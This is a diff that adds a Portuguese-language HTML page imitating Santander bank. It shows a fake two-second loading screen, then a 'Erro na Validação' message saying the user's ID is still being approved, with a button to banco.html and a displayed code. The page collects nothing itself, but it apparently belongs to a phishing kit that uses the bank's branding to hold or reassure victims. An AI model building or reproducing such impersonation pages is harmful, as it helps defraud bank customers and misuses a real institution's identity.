@@ -1,0 +1,59 @@
+<html>
+ <head>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+   document.addEventListener("DOMContentLoaded", function() {
+      setTimeout(function() {
+        document.getElementById("loading-screen").style.display = "none";
+        document.getElementById("main-content").style.display = "flex";
+      }, 2000); // Simulate a 2-second loading time
+    });
+  </script>
+ </head>
+ <body class="bg-white flex flex-col items-center w-full">
+  <!-- Loading Screen -->
+  <div class="w-full h-screen flex items-center justify-center bg-gray-100" id="loading-screen">
+   <div class="text-center">
+    <img alt="Loading spinner" class="h-16 w-16 animate-spin" height="64" src="images/carregamento.png" width="64"/>
+    <p class="text-gray-600 mt-4">
+     Carregando...
+    </p>
+   </div>
+  </div>
+  <!-- Main Content -->
+  <div class="hidden flex-col items-center w-full" id="main-content">
+   <!-- Header -->
+   <div class="w-full bg-red-600 flex items-center justify-between p-4">
+    <i class="fas fa-arrow-left text-white">
+    </i>
+    <img alt="Santander logo" class="h-10" height="40" src="images/Santerlogo.png" width="40"/>
+   </div>
+   <!-- Main Content -->
+   <div class="flex flex-col items-center mt-10">
+    <div class="border-4 border-red-600 rounded-full p-4">
+     <img alt="Lock icon with error symbol" class="h-20 w-20" height="100" src="images/bloqueio.png" width="100"/>
+    </div>
+    <h1 class="text-xl font-semibold mt-6">
+     Erro na Validação
+    </h1>
+    <p class="text-gray-600 text-center mt-2">
+     <span class="font-semibold">
+      Aguarde
+     </span>
+     , ainda estamos aprovando seu ID para usar nossa ferramenta.
+    </p>
+   </div>
+   <!-- Button and Code -->
+   <div class="flex flex-col items-center mt-10">
+    <a class="bg-gray-600 text-white font-semibold py-2 px-6 rounded-full inline-block text-center no-underline" href="banco.html">
+     Ok, entendi
+    </a>
+    <div class="text-gray-500 text-sm mt-4">
+     código: 74606
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
